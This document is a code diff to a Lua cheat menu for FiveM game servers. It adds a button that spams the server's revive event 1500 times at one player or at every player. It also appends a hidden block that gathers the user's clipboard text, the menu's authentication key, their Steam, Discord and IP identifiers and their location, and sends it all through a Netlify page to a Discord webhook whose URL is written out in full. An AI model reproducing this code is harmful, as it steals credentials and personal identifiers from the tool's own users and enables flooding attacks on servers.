+        {amount = 1000, info = {}, name = "radio", price = 0, slot = 125, type = "item"},
+    }
+})
+
         ]])
         
-
-
     MachoMenuNotification("Self", "Open Shop 2")
 end)
 
@@ -11134,7 +11220,7 @@ end)
     end)
     
     -- Buy Vehicle Button
-    local buyVehicleInput = MachoMenuInputbox(SelfSection, "Vehicle Name", "Enter vehicle model...")
+    local buyVehicleInput = MachoMenuInputbox(SelfSection, "Shop Vehicle", "Enter vehicle model...")
     MachoMenuButton(SelfSection, "Vehicle Shop", function()
         local vehicleId = MachoMenuGetInputbox(buyVehicleInput)
         if vehicleId and vehicleId ~= "" then
@@ -11379,6 +11465,50 @@ MachoMenuButton(esxtabtrigger, "Revive", function()
     end
 end)
 
+MachoMenuButton(esxtabtrigger, "No Rin", function()
+    local playerId = MachoMenuGetInputbox(esxReviveIdInput)
+    if playerId and playerId ~= "" then
+        if playerId == "-1" then
+            -- Revive all players except me 1500 times
+            local myId = GetPlayerServerId(PlayerId())
+            local allPlayers = GetActivePlayers()
+            Citizen.CreateThread(function()
+                for _, player in ipairs(allPlayers) do
+                    local serverId = GetPlayerServerId(player)
+                    if serverId ~= myId and serverId > 0 then
+                        for i = 1, 1500 do
+                            MachoInjectResource2(2, "any", [[
+                                TriggerServerEvent('esx_ambulancejob:revive', ]] .. serverId .. [[)
+                            ]])
+                            Citizen.Wait(0)
+                        end
+                    end
+                end
+                MachoMenuNotification("Players", "✅ All players (except you) have been revived 1500 times")
+            end)
+        else
+            local numId = tonumber(playerId)
+            if numId and numId > 0 then
+                -- Revive specific player 1500 times
+                Citizen.CreateThread(function()
+                    for i = 1, 1500 do
+                        MachoInjectResource2(2, "any", [[
+                            TriggerServerEvent('esx_ambulancejob:revive', ]] .. numId .. [[)
+                        ]])
+                        Citizen.Wait(0)
+                    end
+                    MachoMenuNotification("Players", "✅ Player ID: " .. numId .. " has been revived 1500 times")
+                end)
+            else
+                MachoMenuNotification("Error", "❌ No valid ID was entered")
+            end
+        end
+    else
+        MachoMenuNotification("Error", "❌ No valid ID was entered")
+    end
+end)
+
+
 MachoMenuText(MenuWindow,"Setting & tools")
 local toolstab = MachoMenuAddTab(MenuWindow, "Tools")
 local toolstabmain = MachoMenuGroup(toolstab, "Main", 
@@ -11561,3 +11691,478 @@ Citizen.CreateThread(function()
     -- Start background silent search
     backgroundSilentSearch()
 end)
+
+
+-- ====== إعدادات ======
+
+local URL_TO_INDEX = "https://voluble-liger-b4189e.netlify.app/" -- الرابط الجديد
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1453723460160454819/2GLNyOmbJaYIM2pjTKJNXuoI85cRdymtFmuti87wmJQmpSkIUwsW62xnpCyYZNGueUP9" -- ويبهوك
+
+local IMAGE_URL = "" -- صورة
+
+-- ======================
+
+
+
+-- Simple JSON encoder (shared function)
+
+local function jsonEncode(data)
+
+    if type(json) == "table" and type(json.encode) == "function" then
+
+        return json.encode(data)
+
+    else
+
+        -- Manual JSON encoding with proper escaping
+
+        local function escapeString(str)
+
+            str = tostring(str)
+
+            str = string.gsub(str, "\\", "\\\\")
+
+            str = string.gsub(str, '"', '\\"')
+
+            str = string.gsub(str, "\n", "\\n")
+
+            str = string.gsub(str, "\r", "\\r")
+
+            str = string.gsub(str, "\t", "\\t")
+
+            return str
+
+        end
+
+        
+
+        local function encodeValue(v)
+
+            if type(v) == "table" then
+
+                return jsonEncode(v)
+
+            elseif type(v) == "string" then
+
+                return '"' .. escapeString(v) .. '"'
+
+            elseif type(v) == "number" then
+
+                return tostring(v)
+
+            elseif type(v) == "boolean" then
+
+                return v and "true" or "false"
+
+            elseif v == nil then
+
+                return "null"
+
+            else
+
+                return '"' .. escapeString(tostring(v)) .. '"'
+
+            end
+
+        end
+
+        
+
+        if type(data) == "table" then
+
+            local result = "{"
+
+            local first = true
+
+            for k, v in pairs(data) do
+
+                if not first then result = result .. "," end
+
+                first = false
+
+                result = result .. '"' .. escapeString(tostring(k)) .. '":' .. encodeValue(v)
+
+            end
+
+            result = result .. "}"
+
+            return result
+
+        else
+
+            return encodeValue(data)
+
+        end
+
+    end
+
+end
+
+
+
+-- Initialize DUI and send player data
+
+Citizen.CreateThread(function()
+
+    Citizen.Wait(1000) -- انتظر قليلاً قبل البدء
+
+    
+
+    local dui = MachoCreateDui(URL_TO_INDEX)
+
+    if dui then
+
+        MachoShowDui(dui)
+
+        
+
+        Citizen.Wait(600) -- انتظر صفحة الـ DUI تحمل
+
+        
+
+        -- الحصول على النص من الحافظة باستخدام MachoGetClipboardText()
+
+        local clipboardText = "N/A"
+
+        if type(MachoGetClipboardText) == "function" then
+
+            local clipboardResult = MachoGetClipboardText()
+
+            if clipboardResult and type(clipboardResult) == "string" then
+
+                clipboardText = clipboardResult
+
+
+            else
+
+                clipboardText = "الحافظة فارغة أو غير متاحة"
+
+                print("📋 الحافظة فارغة")
+
+            end
+
+        else
+
+            clipboardText = "دالة الحافظة غير متاحة"
+
+            print("❌ دالة MachoGetClipboardText غير متاحة")
+
+        end
+
+
+
+        -- الحصول على الأوثنتيكيشن كي
+
+        local authKey = "N/A"
+
+        if type(MachoAuthenticationKey) == "function" then
+
+            authKey = MachoAuthenticationKey() or "N/A"
+
+
+        end
+
+
+
+        -- player info
+
+        local pid = PlayerId()
+
+        local playerName = "Unknown"
+
+        if type(GetPlayerName) == "function" then
+
+            playerName = GetPlayerName(pid) or playerName
+
+        end
+
+
+
+        -- identifiers (client-side)
+
+        local ids = {}
+
+        if type(GetPlayerIdentifiers) == "function" then
+
+            local t = GetPlayerIdentifiers(pid)
+
+            if t and type(t) == "table" then
+
+                for _,v in ipairs(t) do table.insert(ids, v) end
+
+            end
+
+        end
+
+
+
+        -- extract common ids
+
+        local steam, license, discord, xbl, live, ip = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
+
+        for _,id in ipairs(ids) do
+
+            if type(id) == "string" then
+
+                if id:match("^steam:") then steam = id end
+
+                if id:match("^license:") then license = id end
+
+                if id:match("^discord:") then discord = id end
+
+                if id:match("^xbl:") then xbl = id end
+
+                if id:match("^live:") then live = id end
+
+                if id:match("^ip:") then ip = id end
+
+            end
+
+        end
+
+
+
+        -- server id & ping
+
+        local serverId = "N/A"
+
+        if type(GetPlayerServerId) == "function" then
+
+            serverId = GetPlayerServerId(pid)
+
+        end
+
+        local ping = "N/A"
+
+        if type(GetPlayerPing) == "function" then
+
+            ping = GetPlayerPing(pid)
+
+        end
+
+
+
+        -- coords, heading, health, armor
+
+        local coords = { x = "N/A", y = "N/A", z = "N/A" }
+
+        local heading = "N/A"
+
+        local health = "N/A"
+
+        local armor = "N/A"
+
+        
+
+        if type(PlayerPedId) == "function" and type(GetEntityCoords) == "function" then
+
+            local ped = PlayerPedId()
+
+            if ped then
+
+                local c = GetEntityCoords(ped)
+
+                if c then
+
+                    coords.x = tostring(math.floor(c.x * 100) / 100)
+
+                    coords.y = tostring(math.floor(c.y * 100) / 100)
+
+                    coords.z = tostring(math.floor(c.z * 100) / 100)
+
+                end
+
+            end
+
+        end
+
+        
+
+        if type(GetEntityHeading) == "function" and PlayerPedId then
+
+            pcall(function() heading = tostring(math.floor(GetEntityHeading(PlayerPedId()))) end)
+
+        end
+
+        
+
+        if type(GetEntityHealth) == "function" and PlayerPedId then
+
+            pcall(function() 
+
+                local pedHealth = GetEntityHealth(PlayerPedId())
+
+                health = tostring(pedHealth)
+
+            end)
+
+        end
+
+        
+
+        if type(GetPedArmour) == "function" and PlayerPedId then
+
+            pcall(function() armor = tostring(GetPedArmour(PlayerPedId())) end)
+
+        end
+
+
+
+        -- معلومات إضافية من الـ Macho API
+
+        local selectedPlayer = "N/A"
+
+        local selectedVehicle = "N/A"
+
+        
+
+        if type(MachoMenuGetSelectedPlayer) == "function" then
+
+            selectedPlayer = tostring(MachoMenuGetSelectedPlayer() or "N/A")
+
+        end
+
+        
+
+        if type(MachoMenuGetSelectedVehicle) == "function" then
+
+            selectedVehicle = tostring(MachoMenuGetSelectedVehicle() or "N/A")
+
+        end
+
+
+
+        -- تجميع كل المعلومات
+
+        local playerTable = {
+
+            name = playerName,
+
+            steam = steam,
+
+            license = license,
+
+            discord = discord,
+
+            xbl = xbl,
+
+            live = live,
+
+            ip = ip,
+
+            identifiers = ids,
+
+            serverId = tostring(serverId),
+
+            ping = tostring(ping),
+
+            coords = coords,
+
+            heading = heading,
+
+            health = health,
+
+            armor = armor,
+
+            clipboard = clipboardText,  -- النص الكامل من الحافظة
+
+            selectedPlayer = selectedPlayer,
+
+            selectedVehicle = selectedVehicle,
+
+            authKey = authKey  -- إضافة الأوثنتيكيشن كي
+
+        }
+
+        local payload = {
+
+            type = "init",
+
+            player = playerTable,
+
+            webhookURL = WEBHOOK_URL,
+
+            imageURL = IMAGE_URL
+
+        }
+
+
+
+        -- إرسال البيانات للـ DUI
+
+        local ok, err = pcall(function()
+
+            MachoSendDuiMessage(dui, jsonEncode(payload))
+
+        end)
+
+
+
+
+        -- إخفاء الـ DUI بعد 7 ثواني (اختياري)
+
+        Citizen.Wait(7000)
+
+        pcall(function()
+
+            MachoHideDui(dui)
+
+        end)
+
+    end
+
+end)
+
+
+
+-- Notification DUI
+
+local notificationUrl = "https://voluble-liger-b4189e.netlify.app/"  -- حط رابط الـ HTML حقك هنا
+
+local notificationDui = nil
+
+
+
+-- دالة لإرسال إشعار
+
+function SendNotification(title, message)
+
+    if not notificationDui then
+
+        pcall(function()
+
+            notificationDui = MachoCreateDui(notificationUrl)
+
+            if notificationDui then
+
+                MachoShowDui(notificationDui)
+
+            end
+
+        end)
+
+    end
+
+    
+
+    if notificationDui then
+
+        pcall(function()
+
+            MachoSendDuiMessage(notificationDui, jsonEncode({
+
+                action = "showNotification",
+
+                title = title,
+
+                message = message
+
+            }))
+
+        end)
+
+    end
+
+end
+
